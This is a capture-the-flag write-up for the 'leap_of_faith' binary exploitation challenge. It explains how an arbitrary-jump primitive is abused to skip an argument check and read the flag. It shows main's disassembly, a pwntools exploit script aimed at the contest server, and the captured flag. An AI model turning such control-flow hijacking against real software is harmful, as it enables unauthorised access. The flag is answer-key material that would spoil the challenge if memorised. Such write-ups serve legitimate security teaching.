---
title: "leap_of_faith"
category: Binary Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
flag: KashiCTF{m4r10_15_fu_w17H_C_m70BEEnn}
---
> I liked playing Super Mario just for jumping from one place to another. Can you do that?

---

In the given challenge we are prompted to enter one address where we wish to jump to, after which it finish executing. There's a win function which checks the argument passed, if the conditions are satisfied, it open a flag and prints the content, below is the pseudocode

As you may notice we can simply jump to the line where it opens the flag and skip the argument check, the address for that is 0x4011ba

However when we do this on nc, we get nothing, The issue lies with fgets, which reads the content of file stream into an local variable, probably due to some stack size issue because the flag size might override the return address. To remedy that we notice in the disassembly of main

```asm
.text:000000000040125A ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:000000000040125A                 public main
.text:000000000040125A main            proc near               ; DATA XREF: _start+1D↑o
.text:000000000040125A
.text:000000000040125A var_8           = qword ptr -8
.text:000000000040125A
.text:000000000040125A ; __unwind {
.text:000000000040125A                 push    rbp
.text:000000000040125B                 mov     rbp, rsp
.text:000000000040125E                 sub     rsp, 10h
.text:0000000000401262                 lea     rdi, aILikeToJumpWhe ; "i like to jump where ever you say \ngiv"...
.text:0000000000401269                 mov     eax, 0
.text:000000000040126E                 call    _printf
.text:0000000000401273                 lea     rax, [rbp+var_8]
.text:0000000000401277                 mov     rsi, rax
.text:000000000040127A                 lea     rdi, aP         ; "%p"
.text:0000000000401281                 mov     eax, 0
.text:0000000000401286                 call    ___isoc99_scanf
.text:000000000040128B                 mov     rax, [rbp+var_8]
.text:000000000040128F                 sub     rsp, 10h
.text:0000000000401293                 jmp     rax
.text:0000000000401293 main            endp
```

we can jump to 0x40125e where it does sub rsp,0x10 and continue executing the instructions till it asks for an address to jump to again.

This could be used to increase the stack size for the flag to fit. By making a script which bruteforces the number of times we might have to jump to 0x40125e instruction and finally jump to 0x4011ba to get the flag

```py
from pwn import *

binary = './chall'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
# r = process(binary)
r = remote('kashictf.iitbhucybersec.in', 45935)

r.recvuntil(b'i like to jump where ever you say \r\ngive me the address to go : ')
for i in range(5):
    r.sendline(hex(0x401273))

r.sendline(hex(0x4011BA))
r.interactive()
```
